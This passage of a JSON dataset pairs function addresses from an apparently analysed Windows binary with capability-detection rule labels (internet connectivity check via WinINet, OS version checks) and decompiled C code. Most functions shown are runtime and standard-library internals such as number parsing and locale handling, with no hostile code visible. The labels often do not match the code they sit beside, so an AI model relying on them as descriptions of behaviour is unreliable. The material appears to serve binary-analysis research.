            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004039ae(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_34h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_30h = iVar4;\n    cVar2 = fcn.0040640b(arg_10h);\n    for (iVar3 = 0; (cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        pcVar1 = *(*var_2ch + 0x10);\n        (**0x573000)(0x48, *(arg_ch + 6));\n        cVar2 = (*pcVar1)();\n        iVar4 = var_30h;\n        if (cVar2 == '\\0') break;\n        fcn.004027a2();\n        cVar2 = fcn.0040640b(var_34h);\n        iVar4 = var_30h;\n    }\n    arg_8h = var_34h;\n    cVar2 = fcn.0040640b(var_34h);\n    if (cVar2 != '\\0') goto code_r0x00470d23;\n    if (iVar4 <= iVar3) goto code_r0x00470d23;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.004050a1();\n    }\n    pcVar1 = *(*var_2ch + 0x38);\n    (**0x573000)(*(arg_ch + 6), 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x00470d23;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.004027a2();\ncode_r0x00470d23:\n        cVar2 = fcn.0040640b(var_34h);\n        if ((cVar2 != '\\0') || (var_30h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x573000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.0040640b(var_34h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x573000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_30h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.004027a2();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_38h = 0;\n    iVar4 = fcn.004055b5(&var_24h, &var_3ch, 10, &var_38h);\n    fcn.0040640b(var_34h);\n    if ((((var_3ch != &var_24h) && (var_38h == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.00403085(arg_8h);\n    return;\n}\n",
        "token_count": 1269
    },
    "004039b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004039b3(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.004030e9(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.004026d5(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401366();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401c8f(uVar3);\n    *(iVar5 + 8) = uVar3;\n    fcn.004060fa(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.00406186(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.00406186(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 739
    },
    "004039f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004039f4(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint arg_10h;\n    int32_t iVar6;\n    uint *arg_8h_00;\n    int32_t iVar7;\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_90h;\n    uint var_88h;\n    uint var_80h;\n    uint var_78h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    char *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    bVar3 = false;\n    do {\n        if ((**0x56f458 == '\\0') || (**0x56f458 == '@')) break;\n        if ((*0x56f464 != '\\0') && (*0x56f465 == '\\0')) {\n            return arg_8h;\n        }\n        if (*arg_8h != 0) {\n            var_28h = 0x54f380;\n            var_24h = 2;\n            fcn.00402cfc(&var_28h);\n            fcn.004052f9(&var_30h, arg_8h);\n            *arg_8h = var_30h;\n            arg_8h[1] = var_2ch;\n            if (bVar3) {\n                piVar5 = fcn.00402e87(&var_70h, 0x5b, arg_8h);\n                bVar3 = false;\n                *arg_8h = *piVar5;\n                arg_8h[1] = piVar5[1];\n            }\n        }\n        if (**0x56f458 == '?') {\n            pcVar1 = *0x56f458 + 1;\n            cVar2 = *pcVar1;\n            if (cVar2 == '$') {\n                fcn.00402919(&var_f0h, 1, 0);\n                arg_8h_00 = &var_50h;\n                goto code_r0x0048f617;\n            }\n            if (cVar2 != '%') {\n                if (cVar2 == '?') {\n                    if (((*0x56f458)[2] != '_') || ((*0x56f458)[3] != '?')) {\n                        *0x56f458 = pcVar1;\n                        arg_10h = fcn.00401d20(&var_c8h);\n                        fcn.00402e87(&var_d0h, 0x60, arg_10h);\n                        fcn.004032bf(&var_d8h, 0x27);\n                        arg_8h_00 = &var_e0h;\n                        goto code_r0x0048f617;\n                    }\n                    *0x56f458 = *0x56f458 + 2;\n                    fcn.00402d83(&var_b8h, 0, 0);\n                    piVar5 = fcn.004052f9(&var_c0h, arg_8h);\n                    *arg_8h = *piVar5;\n                    arg_8h[1] = piVar5[1];\n                    if (**0x56f458 == '@') {\ncode_r0x0048f54a:\n                        *0x56f458 = *0x56f458 + 1;\n                    }\n                    goto code_r0x0048f62c;\n                }\n                if (cVar2 == 'A') goto code_r0x0048f58e;\n                if (cVar2 != 'I') {\n                    if (cVar2 == 'Q') {\n                        *0x56f458 = *0x56f458 + 2;\n                        var_4h = 0;\n                        var_8h = 0;\n                        do {\n                            iVar4 = var_8h;\n                            fcn.00402919(&var_20h, 1, 0);\n                            if (var_1ch == '\\0') {\n                                iVar6 = var_1ch;\n                                iVar7 = var_20h;\n                                if (iVar4 != 0) {\n                                    var_18h = var_20h;\n                                    var_14h = var_1ch;\n                                    var_38h = 0x54f380;\n                                    var_34h = 2;\n                                    fcn.00405c95(&var_38h);\n                                    piVar5 = fcn.004052f9(&var_88h, &var_8h);\n                                    iVar6 = piVar5[1];\n                                    iVar7 = *piVar5;\n                                }\n                            }\n                            else {\n                                iVar6 = 2;\n                                iVar7 = 0;\n                            }\n                            var_8h = iVar7;\n                            var_4h = iVar6;\n                            if (iVar6 != '\\0') {\n                                arg_8h[1] = 0;\n                                *arg_8h = 0;\n                                *(arg_8h + 1) = 2;\n                                goto code_r0x0048f62c;\n                            }\n                        } while (**0x56f458 != '@');\n                        fcn.00402e87(&var_90h, 0x5b, &var_8h);\n                        piVar5 = fcn.004032bf(&var_98h, 0x5d);\n                        *arg_8h = *piVar5;\n                        arg_8h[1] = piVar5[1];\n                        goto code_r0x0048f54a;\n                    }\n                    *0x56f458 = pcVar1;\n                    fcn.00404b97(&var_78h);\n                    arg_8h_00 = &var_80h;\n                    goto code_r0x0048f617;\n                }\n                *0x56f458 = *0x56f458 + 2;\n                fcn.00402919(&var_a0h, 1, 0);\n                fcn.004032bf(&var_a8h, 0x5d);\n                piVar5 = fcn.004052f9(&var_b0h, arg_8h);\n                bVar3 = true;\n                goto code_r0x0048f620;\n            }\ncode_r0x0048f58e:\n            *0x56f458 = pcVar1;\n            fcn.0040672b(0x56f458, 0x40);\n            var_40h = \"`anonymous namespace\\'\";\n            var_3ch = 0x15;\n            fcn.00402cfc(&var_40h);\n            fcn.004052f9(&var_10h, arg_8h);\n            *arg_8h = var_10h;\n            arg_8h[1] = var_ch;\n            if (**0x56f450 != 9) {\n                fcn.00405745(&var_48h);\n            }\n        }\n        else {\n            fcn.00402919(&var_58h, 1, 0);\n            arg_8h_00 = &var_60h;\ncode_r0x0048f617:\n            piVar5 = fcn.004052f9(arg_8h_00, arg_8h);\ncode_r0x0048f620:\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\ncode_r0x0048f62c:\n    } while (*(arg_8h + 1) == '\\0');\n    if (**0x56f458 == '\\0') {\n        if (*arg_8h == 0) {\n            fcn.00402e8c(1);\n        }\n        else {\n            var_10h = 0x54f380;\n            var_ch = 2;\n            fcn.004017df(1);\n            fcn.004050ba(&var_58h, &var_10h);\n            piVar5 = fcn.004052f9(&var_50h, arg_8h);\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\n    }\n    else if (**0x56f458 != '@') {\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n    }\n    return arg_8h;\n}\n",
        "token_count": 2114
    },
    "004039f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039f9(uint Ptr)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*0x56ccc4 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_EncodePointer)(Ptr);\n        *0x56ccc4 = *0x56ccc4 + -1;\n        *(*0x56ccc4 * 4 + 0x56f2b0) = uVar2;\n        return;\n    }\n    iVar3 = fcn.0040578b();\n    if (iVar3 != 0) {\n        fcn.00405b7d(0x16);\n    }\n    if ((*0x56ce64 & 2) != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n        if (iVar3 != 0) {\n            pcVar1 = swi(0x29);\n            (*pcVar1)();\n        }\n        fcn.00405998(3, 0x40000015, 1);\n    }\n    fcn.00405fc9(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 275
    },
    "00403a26": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403a26(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((arg_8h != 0) && (arg_8h != 1)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0xffffffff;\n    }\n    uVar2 = *0x570050;\n    *0x570050 = arg_8h;\n    return uVar2;\n}\n",
        "token_count": 126
    },
    "00403a5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403a5d(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = arg_8h >> 6;\n    iVar4 = (arg_8h & 0x3f) * 0x38;\n    iVar3 = *(iVar5 * 4 + 0x570220);\n    uVar1 = *(iVar3 + 0x28 + iVar4);\n    cVar2 = *(iVar3 + 0x29 + iVar4);\n    if (arg_ch == 0x4000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x570220) + 0x29 + iVar4) = 0;\n    }\n    else if (arg_ch == 0x8000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 & 0x7f;\n    }\n    else if ((arg_ch == 0x10000) || (arg_ch == 0x20000)) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x570220) + 0x29 + iVar4) = 2;\n    }\n    else if (arg_ch == 0x40000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x570220) + 0x29 + iVar4) = 1;\n    }\n    if ((uVar1 & 0x80) == 0) {\n        iVar3 = 0x8000;\n    }\n    else if (cVar2 == '\\0') {\n        iVar3 = 0x4000;\n    }\n    else {\n        iVar3 = ((cVar2 != '\\x01') - 1 & 0x30000) + 0x10000;\n    }\n    return iVar3;\n}\n",
        "token_count": 502
    },
    "00403a9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nuint __cdecl\nfcn.00403a9e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    int32_t var_ch;\n    uint var_1ch;\n    uint var_54h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_54h;\n    var_10h = 0xffffffff;\n    var_14h = 0x41e4a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if ((var_8h != NULL) && (*var_8h == 0)) {\n        var_20h = fcn.004024b9(0x18, var_54h);\n        iVar1 = *(var_ch + 4);\n        if (iVar1 == 0) {\n            iVar2 = 0x54018f;\n        }\n        else {\n            iVar2 = iVar1 + 0x1c;\n            if (*(iVar1 + 0x18) != 0) {\n                iVar2 = *(iVar1 + 0x18);\n            }\n        }\n        var_10h = 0;\n        fcn.0040465b(iVar2);\n        var_20h[1] = NULL;\n        *var_20h = vtable.std::numpunct_char_.0;\n        var_10h = 1;\n        fcn.00405a56(&var_54h, 1);\n        *var_8h = var_20h;\n        fcn.00401fb4();\n    }\n    *in_FS_OFFSET = var_18h;\n    return 4;\n}\n",
        "token_count": 562
    },
    "00403acb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403acb(int32_t param_1)\n\n{\n    if (*(param_1 + 0x404) == 0) {\n        return 0x100;\n    }\n    return *(param_1 + 0x400) >> 2;\n}\n",
        "token_count": 63
    },
    "00403b0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403b0c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.004057e5(0);\n    uVar2 = 0xfde9;\n    if (*(var_ch + 8) != 0xfde9) {\n        iVar1 = fcn.004048b8();\n        uVar2 = 0;\n        if (iVar1 == 0) {\n            uVar2 = 1;\n        }\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "00403b52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403b52(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_unsigned_short_int_.0;\n    if (param_1[4] != NULL) {\n        fcn.004040d9(param_1[3]);\n    }\n    fcn.004040d9(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 98
    },
    "00403b6b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403b6b(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.004062c6(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00401ab9();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00404278();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 175
    },
    "00403b93": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t *\nfcn.00403b93(uint param_1, uint32_t *param_2, uint32_t param_3, int32_t *param_4, int32_t param_5, uint8_t param_6, \n            char *param_7, int32_t *param_8)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint8_t **ppuVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t *piVar11;\n    char *pcVar12;\n    int32_t *piVar13;\n    int32_t *in_FS_OFFSET;\n    uint32_t in_stack_ffffff6c;\n    uint32_t uVar14;\n    char *pcStack116;\n    int32_t *piStack112;\n    uint32_t uStack96;\n    uint8_t uStack92;\n    uint32_t uStack88;\n    int32_t *piStack84;\n    int32_t *piStack80;\n    int32_t *piStack68;\n    int32_t *piStack64;\n    uint uStack60;\n    int32_t *piStack56;\n    uint uStack52;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff8c;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e450;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (param_8 == NULL) {\n        piStack44 = NULL;\n    }\n    else {\n        piStack44 = (*param_7 - 0x2bU & 0xfd) == 0;\n    }\n    if (((((*(param_5 + 0x14) & 0xe00) == 0x800) && (piStack44 + 2U <= param_8)) && (param_7[piStack44] == '0')) &&\n       (((piStack44 + 1)[param_7] | 0x20) == 0x78)) {\n        piStack44 = piStack44 + 2U;\n    }\n    piStack80 = *(*(param_5 + 0x30) + 4);\n    (**(*piStack80 + 4))();\n    uStack20 = 0;\n    piStack36 = &stack0xffffffac;\n    uVar14 = 0x41b2a3;\n    piVar6 = fcn.004035a8(piStack36);\n    if ((piStack80 != NULL) && (puVar7 = (**(*piStack80 + 8))(),  puVar7 != NULL)) {\n        uVar14 = 0x41b2c3;\n        (***puVar7)(1);\n    }\n    piStack68 = NULL;\n    piStack64 = 0xf;\n    piStack84 = NULL;\n    if (param_8 < 0x10) {\n        piStack68 = param_8;\n        fcn.0040314d(&stack0xffffffac, 0, param_8);\n        (&stack0xffffffac)[param_8] = 0;\n    }\n    else {\n        uStack20 = 0xffffffff;\n        fcn.0040359e(param_8, uVar14 & 0xffffff00 | pcStack116 & 0xff, 0);\n    }\n    if (0xf < piStack64) {\n        piStack36 = piStack84;\n    }\n    uStack20 = 3;\n    (**(*piVar6 + 0x1c))(param_7, param_7 + param_8, piStack36);\n    piStack112 = *(*(param_5 + 0x30) + 4);\n    (**(*piStack112 + 4))();\n    uStack20 = 4;\n    piStack48 = fcn.0040632a(&stack0xffffff8c);\n    if ((piStack112 != NULL) && (puVar7 = (**(*piStack112 + 8))(),  puVar7 != NULL)) {\n        (***puVar7)(1);\n    }\n    uStack20 = 3;\n    (**(*piStack48 + 0x14))(&stack0xffffff8c);\n    piStack36 = &stack0xffffff8c;\n    if (0xf < uStack96) {\n        piStack36 = pcStack116;\n    }\n    if (*piStack36 - 1U < 0x7e) {\n        uStack20 = 5;\n        uVar5 = (**(*piStack48 + 0x10))();\n        piStack56 = piStack56 & 0xffffff00 | uVar5;\n        uStack40 = uVar5;\n        pcVar12 = piStack36;\n        while( true ) {\n            cVar1 = *pcVar12;\n            if ((0x7d < cVar1 - 1U) || (param_8 - piStack44 <= cVar1)) break;\n            param_8 = param_8 - cVar1;\n            if (piStack68 < param_8) {\n                uStack20 = 5;\n                fcn.004064ab();\n                goto code_r0x0041b9da;\n            }\n            piStack36 = pcVar12;\n            if (piStack64 == piStack68) {\n                uStack20 = 5;\n                in_stack_ffffff6c = in_stack_ffffff6c & 0xffffff00 | uStack92;\n                piStack48 = param_8;\n                fcn.004012c1(1, in_stack_ffffff6c, param_8, 1, uStack40);\n                param_8 = piStack48;\n            }\n            else {\n                piVar6 = &stack0xffffffac;\n                if (0xf < piStack64) {\n                    piVar6 = piStack84;\n                }\n                puVar8 = piStack68 + (1 - param_8);\n                in_stack_ffffff6c = 0x41b484;\n                piStack68 = piStack68 + 1;\n                fcn.004058f3(piVar6 + param_8 + 1, piVar6 + param_8, puVar8);\n                *(piVar6 + param_8) = piStack56._0_1_;\n            }\n            pcVar12 = piStack36;\n            if ('\\0' < *(piStack36 + 1)) {\n                pcVar12 = piStack36 + 1;\n            }\n        }\n    }\n    piVar6 = *(param_5 + 0x20);\n    piStack56 = piStack68;\n    pcVar12 = piVar6 - piStack68;\n    if (piVar6 < piStack68) {\n        pcVar12 = NULL;\n    }\n    if ((SBORROW4(*(param_5 + 0x24), piVar6 == NULL) != false) != *(param_5 + 0x24) - (piVar6 == NULL) < 0) {\n        pcVar12 = NULL;\n    }\n    piStack36 = pcVar12;\n    uVar14 = *(param_5 + 0x14) & 0x1c0;\n    if (uVar14 == 0x40) {\n        uStack88 = param_3;\n        uStack60 = uStack60 & 0xffffff00 | param_3 & 0xff;\n        if (piStack44 != NULL) {\n            piVar6 = piStack84;\n            if (piStack64 < 0x10) {\n                piVar6 = &stack0xffffffac;\n            }\n            piStack48 = param_4;\n            uStack52 = piStack44;\n            do {\n                if (param_4 == NULL) {\ncode_r0x0041b6f0:\n                    uStack60 = CONCAT31(uStack60._1_3_, 1);\n                }\n                else {\n                    uStack40 = piVar6;\n                    uVar2 = *piVar6;\n                    piVar6 = param_4[8];\n                    puVar8 = *piVar6;\n                    if (puVar8 == NULL) {\ncode_r0x0041b730:\n                        uStack20 = 5;\n                        iVar9 = (**(*param_4 + 0xc))(uVar2);\n                        piVar6 = uStack40;\n                        param_4 = piStack48;\n                        if (iVar9 == -1) goto code_r0x0041b6f0;\n                    }\n                    else {\n                        iVar9 = *param_4[0xc];\n                        if (iVar9 < 1) goto code_r0x0041b730;\n                        *param_4[0xc] = iVar9 + -1;\n                        *piVar6 = puVar8 + 1;\n                        *puVar8 = uVar2;\n                        piVar6 = uStack40;\n                    }\n                }\n                piVar6 = piVar6 + 1;\n                uStack52 = uStack52 - 1;\n            } while (uStack52 != NULL);\n        }\n        uStack52 = uStack60 & 0xff | uStack88 & 0xffffff00;\n    }\n    else {\n        if (uVar14 == 0x100) {\n            uStack88 = param_3;\n            uStack60 = uStack60 & 0xffffff00 | param_3 & 0xff;\n            piStack48 = param_4;\n            if (piStack44 != NULL) {\n                piVar6 = piStack84;\n                piVar11 = piStack44;\n                if (piStack64 < 0x10) {\n                    piVar6 = &stack0xffffffac;\n                }\n                do {\n                    piVar13 = piVar11;\n                    if (param_4 == NULL) {\ncode_r0x0041b5e0:\n                        uStack60 = CONCAT31(uStack60._1_3_, 1);\n                    }\n                    else {\n                        uStack52 = piVar11;\n                        uStack40 = piVar6;\n                        uVar2 = *piVar6;\n                        piVar6 = param_4[8];\n                        puVar8 = *piVar6;\n                        if (puVar8 == NULL) {\ncode_r0x0041b630:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uVar2);\n                            pcVar12 = piStack36;\n                            piVar6 = uStack40;\n                            piVar13 = uStack52;\n                            param_4 = piStack48;\n                            if (iVar9 == -1) goto code_r0x0041b5e0;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041b630;\n                            *param_4[0xc] = iVar9 + -1;\n                            *piVar6 = puVar8 + 1;\n                            *puVar8 = uVar2;\n                            pcVar12 = piStack36;\n                            piVar6 = uStack40;\n                            piVar13 = uStack52;\n                        }\n                    }\n                    piVar6 = piVar6 + 1;\n                    piVar11 = piVar13 - 1U;\n                } while (piVar13 - 1U != NULL);\n            }\n            if (pcVar12 != NULL) {\n                uStack40 = param_6;\n                piStack36 = pcVar12;\n                do {\n                    if (param_4 == NULL) {\ncode_r0x0041b670:\n                        uStack60 = CONCAT31(uStack60._1_3_, 1);\n                    }\n                    else {\n                        ppuVar3 = param_4[8];\n                        puVar4 = *ppuVar3;\n     